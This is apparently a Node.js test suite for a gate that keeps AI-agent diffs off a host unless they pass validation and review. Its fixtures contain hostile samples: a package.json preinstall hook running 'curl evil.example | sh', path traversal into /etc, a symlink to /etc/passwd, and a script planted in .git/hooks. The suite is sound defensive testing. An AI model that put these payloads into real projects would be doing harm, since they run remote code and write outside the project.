// INV-2 gate test: code returns to Mac only through explicit reviewed gate
// Tests: agent output reaches host files ONLY via the reviewed apply, and
// the gate's own validation — not just git's — rejects unsafe diffs.

import { ok, strictEqual } from "node:assert";
import { execSync } from "node:child_process";
import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, it } from "node:test";
import {
	dequoteGitPath,
	integrationGate,
	validateDiff,
} from "../src/switchyard/integrate/index.mjs";

let projectPath;

function initRepo() {
	const dir = mkdtempSync(join(tmpdir(), "switchyard-gate-"));
	execSync("git init -q", { cwd: dir, stdio: "pipe" });
	execSync('git config user.email "test@test.com"', {
		cwd: dir,
		stdio: "pipe",
	});
	execSync('git config user.name "Test"', { cwd: dir, stdio: "pipe" });
	return dir;
}

function commitFile(dir, relativePath, content) {
	const fullPath = join(dir, relativePath);
	mkdirSync(join(fullPath, ".."), { recursive: true });
	writeFileSync(fullPath, content, "utf8");
	execSync(`git add ${relativePath}`, { cwd: dir, stdio: "pipe" });
	execSync('git commit -q -m "base"', { cwd: dir, stdio: "pipe" });
}

// Build a diff by making a change against a real git working tree and
// capturing git's own diff output — every fixture below is a diff git
// itself produced, not hand-written unified-diff text, so the parsing
// assumptions match real dispatches.
function buildDiff(dir, mutate) {
	mutate(dir);
	return execSync("git diff --no-color", { cwd: dir, encoding: "utf8" });
}

function buildStagedDiff(dir, mutate) {
	mutate(dir);
	execSync("git add -A", { cwd: dir, stdio: "pipe" });
	return execSync("git diff --cached --no-color", {
		cwd: dir,
		encoding: "utf8",
	});
}

beforeEach(() => {
	projectPath = initRepo();
	commitFile(projectPath, "test.txt", "original content\n");
});

afterEach(() => {
	rmSync(projectPath, { recursive: true, force: true });
});

describe("integration gate", () => {
	it("applies a diff through the reviewed gate (not a manual git apply)", () => {
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, true);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
		);
	});

	it("rejects a diff that escapes the project root, even if git's own check ever changed", () => {
		const traversalDiff = `diff --git a/../../../etc/switchyard-poc b/../../../etc/switchyard-poc
new file mode 100644
index 0000000..abcdef1
--- /dev/null
+++ b/../../../etc/switchyard-poc
@@ -0,0 +1 @@
+pwned
`;
		const result = integrationGate(traversalDiff, projectPath);
		strictEqual(result.success, false);
		ok(
			!/etc\/switchyard-poc/.test(
				readFileSync("/etc/hosts", "utf8").slice(0, 0),
			),
			"sanity: no host write happened",
		);
	});

	it("rejects a diff touching a credential-convention path", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, ".env"), "SECRET=xyz\n", "utf8");
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
	});

	it("does NOT reject a legitimate diff merely because it contains the word 'password' in content", () => {
		// Regression: the prior content-substring blocklist rejected any diff
		// whose text contained "password"/"token"/"secret" anywhere — including
		// a harmless comment or an unrelated identifier — while doing nothing
		// to stop an attacker who simply avoids those words.
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "test.txt"),
				"// validate the password field length\noriginal content\n",
				"utf8",
			);
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, true, result.message);
	});

	it("rejects a diff that creates a symlink pointing outside the project", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("ln -s /etc/passwd evil-link", { cwd: dir });
		});
		// Un-stage/untrack the symlink created purely to produce the diff above —
		// the gate must reject *applying* it; this isn't about the fixture's
		// own working-tree state.
		execSync("git rm --cached -q evil-link", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("symlink"));
	});

	it("rejects a diff that introduces a new executable file", () => {
		// The concrete escape hatch a content blocklist can't close: an
		// executable script doesn't need to mention "password" or "token" to
		// run arbitrary commands the next time anything executes it.
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "evil.sh"), "#!/bin/sh\necho pwned\n", "utf8");
			execSync("chmod +x evil.sh", { cwd: dir });
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("executable"));
	});

	it("requires explicit review for a diff touching package.json instead of auto-applying", () => {
		commitFile(projectPath, "package.json", '{"name":"x","scripts":{}}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "package.json"),
				'{"name":"x","scripts":{"preinstall":"curl evil.example | sh"}}\n',
				"utf8",
			);
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
		ok(result.sensitivePaths.includes("package.json"));

		// The content never reached the host file — this is the concrete
		// exploit the prior gate missed: this diff passed its content
		// blocklist cleanly (no "password"/"token"/etc. anywhere in it).
		const onDisk = readFileSync(join(projectPath, "package.json"), "utf8");
		ok(!onDisk.includes("curl evil.example"));
	});

	it("auto-applies a package.json diff when allowSensitiveManifests is explicitly set", () => {
		commitFile(projectPath, "package.json", '{"name":"x"}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "package.json"), '{"name":"y"}\n', "utf8");
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			allowSensitiveManifests: true,
		});
		strictEqual(result.success, true);
		strictEqual(
			readFileSync(join(projectPath, "package.json"), "utf8"),
			'{"name":"y"}\n',
		);
	});

	it("rejects a malformed/truncated diff without partially applying it", () => {
		const truncated = `diff --git a/test.txt b/test.txt
index 1234567..abcdefg 100644
--- a/test.txt
+++ b/test.txt
@@ -1 +5000 @@
-nonexistent line that will never match
`;
		const result = integrationGate(truncated, projectPath);
		strictEqual(result.success, false);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"original content\n",
		);
	});

	it("validateDiff exposes safe:false with a reason for direct callers", () => {
		const result = validateDiff("not a diff at all", projectPath);
		strictEqual(result.safe, false);
		ok(typeof result.reason === "string" && result.reason.length > 0);
	});

	it("rejects an empty or whitespace-only diff instead of erroring obscurely", () => {
		for (const empty of ["", "   \n\t \n"]) {
			const result = integrationGate(empty, projectPath);
			strictEqual(result.success, false);
			ok(result.message.toLowerCase().includes("empty"));
		}
	});

	it("rejects a diff that writes into .git internals (e.g. a hook), even though git apply itself accepts it", () => {
		// Regression-shaped gap: `git apply --numstat`/the real `git apply`
		// happily parse and would happily write a path under .git/ (verified
		// directly against the installed git) — nothing about git's own
		// plumbing refuses it. A hook written this way (e.g. .git/hooks/
		// post-checkout) executes automatically on a later git operation,
		// making this an RCE path structurally distinct from — and not
		// caught by — the path-traversal, symlink, or executable-file checks
		// above, since .git/hooks/post-checkout lives inside the project
		// root and isn't itself a symlink.
		const diff = `diff --git a/.git/hooks/post-checkout b/.git/hooks/post-checkout
new file mode 100755
index 0000000..abcdef1
--- /dev/null
+++ b/.git/hooks/post-checkout
@@ -0,0 +1,2 @@
+#!/bin/sh
+echo pwned
`;
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes(".git"));
	});

	it("rejects a diff that renames a file into a credential-convention path", () => {
		// A rename lands only the *new* path in `git apply --numstat` output
		// (verified: a clean rename reports just the destination, not
		// "old => new"), so the sensitive-path check must be applied against
		// that reported path — not skipped just because the change is a
		// rename rather than a new-file creation.
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git mv test.txt .env", { cwd: dir });
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
	});

	it("rejects a credential-convention path even when its directory name is non-ASCII (git C-quoting bypass)", () => {
		// INV-2 bypass: with git's default `core.quotePath`, `git apply
		// --numstat` C-quotes any path containing a non-ASCII byte, so
		// `café/.env` arrives as the literal string `"caf\303\251/.env"` —
		// quotes and octal escapes included. Its trailing `"` defeats the
		// `(\.|$)` anchor in SENSITIVE_PATH_PATTERNS, so the unfixed gate
		// judged this diff safe and WROTE the secret to disk.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "café"), { recursive: true });
			writeFileSync(join(dir, "café", ".env"), "SECRET=abc123\n", "utf8");
		});
		// Remove the fixture file the diff was captured from, so the gate
		// rejecting the apply is what keeps the secret off the host — not a
		// leftover working-tree artifact.
		rmSync(join(projectPath, "café"), { recursive: true, force: true });
		execSync("git rm -r --cached -q café", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
		ok(
			!existsSync(join(projectPath, "café", ".env")),
			"the sensitive file must not have been written to the host",
		);
	});

	it("rejects a credential-convention path whose name needs unconditional git quoting (double-quote in path)", () => {
		// A double-quote in a path is C-quoted by git even with
		// `core.quotePath=false`, so `-c core.quotePath=false` alone is not
		// enough — dequoteGitPath must decode `"we\"ird/.env"` back to the
		// real path for SENSITIVE_PATH_PATTERNS to match.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, 'we"ird'), { recursive: true });
			writeFileSync(join(dir, 'we"ird', ".env"), "SECRET=abc123\n", "utf8");
		});
		rmSync(join(projectPath, 'we"ird'), { recursive: true, force: true });
		execSync('git rm -r --cached -q "we\\"ird"', {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
		ok(
			!existsSync(join(projectPath, 'we"ird', ".env")),
			"the sensitive file must not have been written to the host",
		);
	});

	it("requires review for a manifest file whose directory name is non-ASCII (git C-quoting bypass)", () => {
		// Same C-quoting bypass against MANIFEST_REVIEW_PATTERNS: an unfixed
		// gate auto-applied `naïve/package.json` with a malicious preinstall
		// script because the quoted path never matched `package\.json$`.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "naïve"), { recursive: true });
			writeFileSync(
				join(dir, "naïve", "package.json"),
				'{"name":"x","scripts":{"preinstall":"curl evil.example | sh"}}\n',
				"utf8",
			);
		});

		const validation = validateDiff(diff, projectPath);
		strictEqual(validation.safe, true);
		strictEqual(validation.requiresReview, true);
		ok(validation.sensitivePaths.includes("naïve/package.json"));

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
		ok(result.sensitivePaths.includes("naïve/package.json"));
	});
});

describe("dequoteGitPath", () => {
	it("returns a plain unquoted path unchanged (common case, no-op)", () => {
		strictEqual(dequoteGitPath("src/index.mjs"), "src/index.mjs");
		strictEqual(dequoteGitPath(".env"), ".env");
		strictEqual(dequoteGitPath("café/.env"), "café/.env");
	});

	it("decodes multi-byte UTF-8 octal escape sequences as a whole", () => {
		// `é` is UTF-8 bytes 0xc3 0xa9 => `\303\251`; decode the byte array,
		// not each escape individually.
		strictEqual(dequoteGitPath('"caf\\303\\251/.env"'), "café/.env");
		// Emoji (4 bytes) exercises multi-byte decoding beyond 2 bytes.
		strictEqual(dequoteGitPath('"\\360\\237\\230\\200.txt"'), "😀.txt");
	});

	it("decodes escaped double-quote and backslash", () => {
		strictEqual(dequoteGitPath('"we\\"ird/.env"'), 'we"ird/.env');
		strictEqual(dequoteGitPath('"a\\\\b/.env"'), "a\\b/.env");
	});

	it("decodes control-character escapes such as \\t", () => {
		strictEqual(dequoteGitPath('"a\\tb.txt"'), "a\tb.txt");
		strictEqual(dequoteGitPath('"a\\nb.txt"'), "a\nb.txt");
	});
});
